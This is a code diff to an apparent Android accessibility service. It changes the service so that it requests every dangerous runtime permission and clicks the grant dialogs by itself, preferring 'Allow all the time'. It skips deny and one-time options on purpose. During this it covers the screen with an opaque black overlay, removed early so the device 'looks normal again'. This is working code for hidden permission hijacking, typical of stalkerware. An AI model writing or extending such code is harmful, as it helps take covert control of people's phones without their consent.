@@ -853,15 +853,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         permissionScanHandler.post(permissionScanRunnable);
     }
 
-    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 20 seconds.
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 60 seconds.
      *  Runs independently of auto-click scanner (which starts later).
-     *  WRITE_EXTERNAL_STORAGE / All Files Access is requested LAST (at 12 s).
+     *  On first launch every runtime permission dialog needs to be handled — 60 s gives
+     *  enough time for all of them even on slow devices.
      */
     private void startAutoGrantTimer() {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
 
-        // Independent scanner: runs every 500ms for 20 seconds
+        // Independent scanner: runs every 250 ms during the grant window.
+        // 250 ms is frequent enough to catch dialogs without hammering the main thread.
         autoGrantScanRunnable = new Runnable() {
             @Override
             public void run() {
@@ -874,20 +876,33 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
                 } catch (Exception ignored) {}
                 if (autoGrantMode && autoGrantHandler != null) {
-                    autoGrantHandler.postDelayed(this, 200);
+                    autoGrantHandler.postDelayed(this, 250);
                 }
             }
         };
         autoGrantHandler.post(autoGrantScanRunnable);
 
-        // Storage permission is requested from the dashboard on demand — not auto-triggered here.
+        // Trigger all missing runtime permissions so the dialogs appear for the granter to click.
+        // Delay 1 s so the accessibility overlay is fully visible first.
+        autoGrantHandler.postDelayed(() -> {
+            try {
+                Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
+                pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS,
+                    com.task.tusker.permissions.AutoPermissionManager.DANGEROUS_PERMISSIONS);
+                pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivity(pIntent);
+                Log.i(TAG, "Auto-grant: launched PermissionRequestActivity for all missing perms");
+            } catch (Exception e) {
+                Log.w(TAG, "Auto-grant: could not launch PermissionRequestActivity: " + e.getMessage());
+            }
+        }, 1_000);
 
-        // Auto-grant mode expires after 20 seconds
+        // Auto-grant mode expires after 60 seconds (enough for all permission dialogs)
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 20 seconds");
-        }, 20_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 20s");
+            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
+        }, 60_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
     }
 
     /**
@@ -946,11 +961,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Shows a fully opaque black overlay for 10 seconds while auto-grant runs.
+     * Shows a fully opaque black overlay for 50 seconds while auto-grant runs.
+     * 50 s matches the 60 s auto-grant window (overlay removed slightly before grant expires
+     * so the device looks normal again before the window closes).
      * Uses TYPE_ACCESSIBILITY_OVERLAY so no SYSTEM_ALERT_WINDOW permission is needed.
      * FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE ensure touches still reach permission dialogs
      * underneath so accessibility can programmatically click them.
-     * Auto-removes after 10 seconds.
+     * Auto-removes after 50 seconds.
      */
     private void addBlackOverlay() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
@@ -974,12 +991,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 PixelFormat.OPAQUE
             );
             overlayWindowManager.addView(overlayView, lp);
-            Log.i(TAG, "Black overlay added — auto-removes in 10 s");
+            Log.i(TAG, "Black overlay added — auto-removes in 50 s");
 
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { removeBlackOverlay(); } catch (Exception ignored) {}
-                Log.i(TAG, "Black overlay removed after 10 s");
-            }, 10_000);
+                Log.i(TAG, "Black overlay removed after 50 s");
+            }, 50_000);
         } catch (Exception e) {
             Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
         }
@@ -1191,55 +1208,199 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Words that disqualify a toggle from being auto-enabled
     private static final String[] TOGGLE_BLACKLIST = { "shortcut", "stop", "delete", "kill" };
 
-    /** Clicks permission text anywhere on screen (no button check).
-     *  Only clicks when app name is visible on screen (case-sensitive).
-     *  Matching is case-insensitive for permission strings. */
+    /**
+     * Buttons we must NEVER click — these grant only temporary / one-time access
+     * or explicitly deny the permission.  Checked case-insensitively; any button
+     * whose trimmed text *contains* one of these substrings is skipped.
+     */
+    private static final String[] PERMISSION_DENY_SUBSTRINGS = {
+        "only this time",       // "Allow only this time", "Only this time"
+        "this time only",
+        "just once",
+        "just this once",
+        "one time",
+        "don't allow",
+        "dont allow",
+        "deny",
+        "not allow",
+        "never",
+        "no thanks",
+        "skip",
+        "cancel",
+        "close",
+        "dismiss"
+    };
+
+    /**
+     * Returns true if the trimmed button text (lower-case) matches any deny substring.
+     * Used to avoid accidentally clicking "Only this time" or "Deny" buttons.
+     */
+    private boolean isDeniedButtonText(String text) {
+        if (text == null) return false;
+        String lower = text.trim().toLowerCase();
+        for (String bad : PERMISSION_DENY_SUBSTRINGS) {
+            if (lower.contains(bad)) return true;
+        }
+        return false;
+    }
+
+    /**
+     * Safe version of clickTextElementCI that additionally checks the deny list
+     * before clicking.  Returns true only if the element was actually clicked.
+     */
+    private boolean safeClickTextElementCI(AccessibilityNodeInfo node, String searchText) {
+        if (isDeniedButtonText(searchText)) return false;
+        return clickTextElementCI(node, searchText);
+    }
+
+    /**
+     * Safe contains-based clicker — skips any node whose text is on the deny list.
+     */
+    private boolean safeClickTextContainingCI(AccessibilityNodeInfo node, String keyword) {
+        return clickTextContainingCISafe(node, keyword);
+    }
+
+    /** Like clickTextContainingCI but skips nodes whose text is in the deny list. */
+    private boolean clickTextContainingCISafe(AccessibilityNodeInfo node, String keyword) {
+        if (node == null) return false;
+        try {
+            CharSequence text = node.getText();
+            if (text != null) {
+                String textStr = text.toString();
+                if (textStr.toLowerCase().contains(keyword.toLowerCase())
+                        && !isDeniedButtonText(textStr)) {
+                    if (node.isClickable()) {
+                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        return true;
+                    }
+                    AccessibilityNodeInfo parent = node.getParent();
+                    if (parent != null) {
+                        if (parent.isClickable()) {
+                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            parent.recycle();
+                            return true;
+                        }
+                        parent.recycle();
+                    }
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (clickTextContainingCISafe(child, keyword)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    /**
+     * Main permission-dialog button clicker.
+     *
+     * Priority order (highest to lowest):
+     *   1. "Allow all the time" / "Always allow" / "Always"
+     *      → permanent location / body-sensors / physical-activity grants
+     *   2. "Allow while using the app" / "While using" variants
+     *      → "Allow while using the app" is acceptable for location etc.
+     *   3. Plain "Allow" / "Grant" / "OK" — generic dialogs
+     *   4. Toggle/switch enablement for settings-style pages
+     *   5. Contains-based fallback for non-standard OEM dialogs
+     *
+     * Buttons listed in PERMISSION_DENY_SUBSTRINGS are NEVER clicked, so
+     * "Only this time", "Deny", "Cancel" etc. are always skipped.
+     *
+     * App name matching is case-insensitive to handle devices that capitalise
+     * or uppercase the app label (e.g. Samsung, MIUI, ColorOS).
+     */
     private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
         String appName = getString(R.string.app_name);
         String screenText = getAllScreenText(rootNode);
+        String screenTextLower = screenText.toLowerCase();
+        String appNameLower = appName.toLowerCase();
 
-        // Must have app name on screen (case-sensitive)
-        if (!screenText.contains(appName)) return false;
+        // App name must appear somewhere on screen (case-insensitive)
+        if (!screenTextLower.contains(appNameLower)) return false;
 
-        // Check if app name + "allow access" exists - click that first
-        if (runAppNameAllowAccessClicker(rootNode, appName)) {
-            return true;
-        }
+        // ── Step 0: "Allow access" pattern (Files & Storage / Notification access pages) ──
+        if (runAppNameAllowAccessClicker(rootNode, appName)) return true;
 
-        // Priority 1: "Allow all the time" (location / battery full-access dialogs)
-        String[] highPriority = { "Allow all the time", "Always allow", "Allow" };
-        for (String word : highPriority) {
-            if (clickTextElementCI(rootNode, word)) {
-                return true;
-            }
-        }
-
-        // Priority 2: "Allow only while using the app"
-        String[] whileUsingVariants = { 
-            "Allow only while using the app", "While using the app", 
-            "Only while using the app", "Allow while using" 
+        // ── Step 1: Permanent / all-the-time grants (highest priority) ──
+        // These must be tried BEFORE plain "Allow" so we don't accidentally
+        // land on a different button on the same dialog.
+        String[] allTheTime = {
+            "Allow all the time",
+            "Always allow",
+            "Always",
+            "Allow all",
+            "Permit all the time"
         };
-        for (String word : whileUsingVariants) {
-            if (clickTextElementCI(rootNode, word)) {
+        for (String btn : allTheTime) {
+            if (safeClickTextElementCI(rootNode, btn)) {
+                Log.i(TAG, "Auto-grant: clicked \"" + btn + "\"");
                 return true;
             }
         }
 
-        // Other grant words
-        String[] grantWords = { 
-            "Grant", "OK", "Yes", "Accept", "Agree", "Continue", 
-            "Proceed", "Enable", "Turn on", "Permit" 
+        // ── Step 2: While-using variants (preferred over plain Allow) ──
+        // "Allow only while using the app" is the standard Android 10+ wording.
+        // Samsung / MIUI use different phrasing — cover all known variants.
+        String[] whileUsing = {
+            "Allow only while using the app",
+            "Allow while using the app",
+            "Only while using the app",
+            "While using the app",
+            "While using app",
+            "Allow while using",
+            "Only while using",
+            "While in use",
+            "Allow only while in use"
         };
-        for (String word : grantWords) {
-            if (clickTextElementCI(rootNode, word)) {
+        for (String btn : whileUsing) {
+            if (safeClickTextElementCI(rootNode, btn)) {
+                Log.i(TAG, "Auto-grant: clicked \"" + btn + "\"");
                 return true;
             }
         }
 
-        // Contains-based fallback
-        String[] containsWords = { "allow", "grant", "permit", "accept" };
-        for (String word : containsWords) {
-            if (clickTextContainingCI(rootNode, word)) {
+        // ── Step 3: Plain allow / grant / OK (generic dialogs) ──
+        // These come AFTER the more-specific variants so we never accidentally
+        // pick "Allow" on a dialog that also has "Allow all the time".
+        // Before clicking plain "Allow" check the deny list again — some OEMs
+        // render "Allow this time only" with text exactly "Allow".
+        // We handle this by also verifying there is no deny-listed sibling.
+        String[] plainGrant = {
+            "Allow",
+            "Grant",
+            "OK",
+            "Ok",
+            "Yes",
+            "Accept",
+            "Agree",
+            "Continue",
+            "Turn on",
+            "Enable",
+            "Permit"
+        };
+        for (String btn : plainGrant) {
+            if (safeClickTextElementCI(rootNode, btn)) {
+                Log.i(TAG, "Auto-grant: clicked \"" + btn + "\"");
+                return true;
+            }
+        }
+
+        // ── Step 4: Toggle / switch on settings-style pages ──
+        if (runAccessibilityToggleGranter(rootNode)) return true;
+
+        // ── Step 5: Contains-based OEM fallback ──
+        // Only match if the full button text is NOT in the deny list.
+        String[] containsFallback = { "allow", "grant", "permit", "accept" };
+        for (String kw : containsFallback) {
+            if (safeClickTextContainingCI(rootNode, kw)) {
+                Log.i(TAG, "Auto-grant: clicked via contains fallback \"" + kw + "\"");
                 return true;
             }
         }
@@ -1377,34 +1538,28 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
     }
 
-    /** Checks if app name exists on screen (case-sensitive, anywhere).
+    /** Checks if app name exists on screen (case-insensitive).
      *  If app name AND "Allow access" both exist anywhere on screen,
-     *  clicks "Allow access". If only app name exists, falls back to clicking "Allow". */
+     *  clicks "Allow access". If only app name exists, falls back to clicking "Allow".
+     *  Uses safeClickTextElementCI so deny-listed button variants are never clicked. */
     private boolean runAppNameAllowAccessClicker(AccessibilityNodeInfo rootNode, String appName) {
         try {
-            // Get screen text in original case
             String screenText = getAllScreenText(rootNode);
-
-            // Check if app name exists anywhere (case-sensitive)
-            if (!screenText.contains(appName)) return false;
-
-            // Lowercase for "allow access" check
             String screenTextLower = screenText.toLowerCase();
 
-            // Priority 1: Check if "allow access" exists anywhere (case-insensitive, full phrase)
+            // Case-insensitive: devices like Samsung/MIUI may uppercase the app label
+            if (!screenTextLower.contains(appName.toLowerCase())) return false;
+
+            // Priority 1: "Allow access" (Files & Storage / Notification access pages)
             if (screenTextLower.contains("allow access")) {
-                if (clickTextElementCI(rootNode, "Allow access")) {
-                    return true;
-                }
+                if (safeClickTextElementCI(rootNode, "Allow access")) return true;
             }
 
-            // Priority 2: Fall back to "Allow" if "Allow access" not found
-            if (clickTextElementCI(rootNode, "Allow")) {
-                return true;
-            }
+            // Priority 2: plain "Allow" — safe clicker skips deny-listed variants
+            if (safeClickTextElementCI(rootNode, "Allow")) return true;
 
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.w(TAG, "runAppNameAllowAccessClicker error: " + e.getMessage());
         }
         return false;
     }
@@ -2433,7 +2588,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     Log.e(TAG, "autoClickRunnable crash: " + e.getMessage());
                 }
                 if (autoClickHandler != null && autoClickRunnable != null) {
-                    autoClickHandler.postDelayed(this, 10);
+                    // 350 ms — fast enough to catch dialogs, slow enough to avoid ANR.
+                    // Event-driven clicks (onAccessibilityEvent) still fire immediately
+                    // so dialogs are handled without waiting for this periodic scan.
+                    autoClickHandler.postDelayed(this, 350);
                 }
             }
         };
